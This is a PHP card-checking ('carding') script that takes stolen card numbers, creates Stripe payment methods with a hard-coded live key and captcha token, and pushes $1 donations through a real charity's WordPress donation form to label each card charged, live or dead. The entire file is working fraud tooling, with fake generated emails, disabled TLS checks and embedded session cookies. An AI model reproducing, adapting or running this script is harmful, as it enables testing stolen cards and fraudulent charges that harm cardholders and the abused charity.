<?php 
////////////////////////////===RAW BY HARIS===////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$last4 = substr($cc, -4);

$ch = curl_init();



#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

curl_close($ch);

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end) {
    $start = @strpos($str,$find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));

}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[1 Req]

sleep(1);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=%E1%80%9C%E1%80%AE%E1%80%B8%E1%80%B8%E1%80%B8&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][postal_code]=10080&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=a2c25c79-eb1c-4e8b-906e-81711ab60b6a199180&sid=NA&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+card-element&referrer=https%3A%2F%2Fsmofi.org&time_on_page=43813&key=pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiQlpUY1IyUU5EWDkvMDc2Ti8ramlLSFZsc2YwL0ovc1hqczVLa1dXckNtcVc0M0JmMUVYN1FUa3EyQms0S3dmY0RFbWh0Qm9xb0dKem51eVJmYXdFWVpFQXZLYXhrZlJlWTRpK1EwNjJPeTJUMTg3Q3dvajNWTGM2MkZJUVJwNnplMHBQV09MeXFzN1VPM250YUM3dVh4WHFUdjBIZ0taNkU4YXpPUENkUEQxaDBmdC9mbFhHU1B2NmdWejNSZGdid1RBU1JNd2xNTXF0YkgwbGRUM0hHMlFhemVpZC9tY3RGSkUweWk1dy80N21BVnVoamlBZlRuV015bnp4QWxhMHo4L25MVzdTRXFCTHRIS0J3dGRNblRZSVdnbk83K2ZoeHBHMnlubEFWcnVNY3JvSGNGbFdIbkd2N282dFlEZWY1a25oampXR3cxcjhvYXBxMEpkOE1GOFNybVF2c2V0UmRtQUV1ZGFsa1dsMlpSZTUyU2pVMFEzOEVBRWh5WlpFUW5lNUJia1huYU5lZFNXaldqVmVTTlg4Z0FTU0RlN0ZNTDEvVzJQdEFXR0dnUXZOYjhKblZ0MGFtbXZsSjgyMTBjZDByTWpoODJTZ0hKK0szWTdBNDJUQkdUdklQQjhrTVpGclI4VGJDemduZUtsOTdZQzN3RElzMG9HWlpGMHFoTkNqY1c0SU1CQUN6UnkrSFplQVo2ZHNzS0lrSWcraXI3c21HWXZLb0I3SFl4VWt5eGJjUCtCQ3ZlMkF0VFFBUzA1SVFkL05NSGZhNDY2TkJRYWNSZk1yQ3orRjhKV0dQMnFubGM4UzRUb0ZUNFdZSzMzbjlsRWJIRnFDNWwzU2Vja2Y1SXVyaTJ4RFIzMEpVbCt5Y3l6ZWdpVEo0ZHZrUm1lWTBOam56V2c2blg1WFdid3ZMNTBzdFdYb3lRVWtteW9iajk1M2VQamoyaXFDU0dscTlVQW1wdjRwQ3MvRHhzZFJ5MGlhT0pwMUUrOS9Zb3U0V0FGOEswU2cwb2JyckpzNkU2Yy9hUDF6dUFtSm1SSk1BeFhJVzVRTVRoOXlyR25hSms4L3k5MW5MTFJUa20zOFh0cjF0UHdTdnQ0aVJpSkNIL05iMXdXcVFOYnhNcE1kV1JRY0JOV1Z4RDczd3hoM1lWd09HQ1hvdzFLbjY2b3I2OVFrTGpNclgvaTdxcGhJS0N0clZnUWsvbkdOOXhEMEpKaXVXQ00vRDEwemtCdmI0NUgwV1MvKys1QUhvbTZDMXhxamplNG4xUDExVUdBdUQrbVE1VCszUS9kR2kwZjNSc3kyNmwyU3oxYzk0RFd3LzM0YmFnMElBcEJiRS9VTEd5SXRuT3dxQW1Kdkkra2FmMkNLME1qYjMxNERRT1F4N3h5bkJmOTZEeGttZ1JFQ2YwOG1Rb2xnSC9iTmZjM1VncSsvUUdGakFmN25pa2MwdU1WZVRFWUVGKzlKeUxnMmFLSTZscDU1RUxJQ2lZbXZPcEIwTlZiOTVuVEdjWStCakZiNW12ck1uYkU2NXZ2SmVoWVBXRjdaY29nek01Z2Uxa0JpRGlkcVBORDI4Mm5xamY3S1U0UUhHM0NFWXlXOVJjdDFXRGdMaXZJK2NTenU4c0xYYkcxSVZKbjlvK1UzTEZOQUV1MkM2aHBOeUVpYXFtVm5RcDZ6dktEUDFqVXdGd2Z2cjhoVlFIMmJLTjdiWjI5ejQydUhBNms5VEdHM0RRTVQvK1ZDTTh0VWhkZ3JqaUVWeDhrZTY1YUdhUDBVZklncC9mOVNOTzBiMVBNZWZNVGU1bVRNTUY1bE5hLy9idUh0b0RWd0dlR1AxQTVydiszUmpxNFkvdHNvaFFEVmFMQytpTzIxWmhmd1EwQTZMc3IxS2duQlI2UUtrWWpwdkxEWUY0M0hsUG83aVo0UFp0d0NFUzhDTXlpM2gyL1p1SU9UdjRnS1NMbDQrbWM5NTVBZmhhbk00YWFGMTBLaVZoUUtyeVdqcTBWZUMyV3QrVGFrU3d2Sm1GOUhaYVAzWGJ0VHI5VzN5V3lkbWs1ZHBJd1RJT0Z4dFFKSG0zbVdUQ3IvcVY0Rlh5RWI0MEVFUStScFVqTUJndmZHNVlPZDgwc0lhRXdQaUxWWEhrUXBXVnZiR0lXQlRpUnhycktHTGhDMlc2NVliQS9ic1ZFWHZrMUNaemU4RUdBNUh5OVg1MmZTelc4K1A0OCtPcTRHSTdvRE1TTUllaDlmbDJuMFN1OHBQRGduZlFJYW94em8xL3VxOFJ4c3FmMHlTVUdESGxJTmNETmt3R0R3SVIwcERWSHo3bVVCR3RQK2NtR2VDTzF0ZVhLbXBsWGNaWlVIaE54Ujg0WnR2WktGY2trc1E0RWlLSHQwN2t6STYybFBnYkRkWGdBcERrM2lnNzFGR0E0Qk53UUx0QisyRkNNSzRJZEt1WktYbmgvYlBGVDAxTXl4NTVHeFJXRTNrT0dqNGdBUWJ6U1RxNDh2R1hJd2I5SHpyTk1uK1lYelFnNGxIaFRxTjlPVHdYNTNDZjVjQXFNUlkrQVJHTFVsSkI1VVZITXhBM3B4cmNzL096bDEzSVVpeXVBQnl2NStxNkg4VUxiUmIvcUhxZE1EQXRlOGpHdi9XemNqR3pVbXY3d3Z4bFF5N1RPSkhtbEJwdnJQMFA2TU9wSzEzaUt5YnFOTXpHVnArZGZtdlZHWDF5akkzKzEyR2tZdUVzRlN4L2pjdmt0cFQxZlBvQ3UwbGwveGY5Qmo0RThsZmFkRjhYNzd0MWxnUlBOM0Y0YWx6T1BqMzZUTWZpNjJnRWdKSVRRL0lmVlgxNEw0RVAxcWR4eVUzbFBnL2ZJdG1WOWhxejNJVFdhaEZOaWF2V3U0IiwiZXhwIjoxNzMyNzAwNDEyLCJzaGFyZF9pZCI6MzYyNDA2OTk2LCJrciI6IjEwMGI0YWE5IiwicGQiOjAsImNkYXRhIjoiRC9vUmhqbTlQZXg0aWhTWnhCRXFvUXd2WVNxSWM2VXlrWVBDcEszZmo2SkJib1V3WGRveFdFcHVXa2ZlWXJqTTZMZHl6L0huWlh2NmNjb1lueWRFUXpxa3Mrd09kdGMrd1dXU2x1Y2hSN0x4SXFFdjVqcW53L2ViOGx2QU9KMzltajlXUzU4Qkd6STJ1akZWMlpJd2ZrN3U2K1h3OWF3QVFRdFVmdlZiVzY2dXB1VEZHRS9BeHRrK2lEMEYzOFNBZVFGTHBiL3F0cTBXMmVNNiJ9._gyW6h1FemthFVr5U44QqUYUcerI0BgRN98xEoSnl30');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$country1 = trim(strip_tags(getStr($result1,'"country": "','"')));
$funding1 = trim(strip_tags(getStr($result1,'"funding": "','"')));

////////////////////////////===[2 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_URL, 'https://smofi.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php h2',
'Host: smofi.org',
'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://smofi.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://smofi.org/donations/',
'accept-language: en-US,en;q=0.9',
'cookie: __stripe_mid=a2c25c79-eb1c-4e8b-906e-81711ab60b6a199180',
'cookie: charitable_session=0058ca300b4ef740d571dee1266f5267||86400||82800',
));



////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'charitable_form_id=674997f7bff68&674997f7bff68=&_charitable_donation_nonce=4e85d30578&_wp_http_referer=%2Fdonations%2F&campaign_id=2600&description=Donations+to+SMOFI&ID=0&donation_amount=custom&custom_donation_amount=1.00&first_name=Dff&last_name=Fg&phone_number=09400691006&email='.$email.'&donor_comment=&gateway=stripe&stripe_payment_method='.$id.'&action=make_donation&form_action=make_donation');

$result = curl_exec($ch); // Execute the cURL request
$json_result = json_decode($result, True);
$msg = $json_result["errors"];


////////////////////////////===[Responses CVV]===////////////////////////////

sleep(1);
if
(strpos($result,  '"requires_action":true,"secret":')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>CHARGED CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : Payment successful ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}

elseif
(strpos($result,  'invalid_cvv')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}

elseif
(strpos($result,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}
elseif
(strpos($result,  'authentication required')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}
elseif
(strpos($result,  'Your card security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}

elseif
(strpos($result,  "Your card's security code is invalid.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}
elseif
(strpos($result,  'Invalid account.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}
elseif
(strpos($result,  'Your card security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}

elseif
(strpos($result,  'Your card insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}

elseif
(strpos($result,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}

elseif
(strpos($result,  "Your card's security code is incorrect.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx </i></font><br>";
}

elseif
(strpos($result,  'Your card does not support this type of purchase')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CVV LIVE ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @Ownerxxxxx ⚡ </i></font><br>";
}

elseif
(strpos($result,  "Missing payment details.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>DIE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>RESULT : Your card has expired. ❌ </i></font><br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>DIE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>RESULT : Your card was declined ❌ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;

////////////////////////////===RAW BY HARIS===////////////////////////////
?>
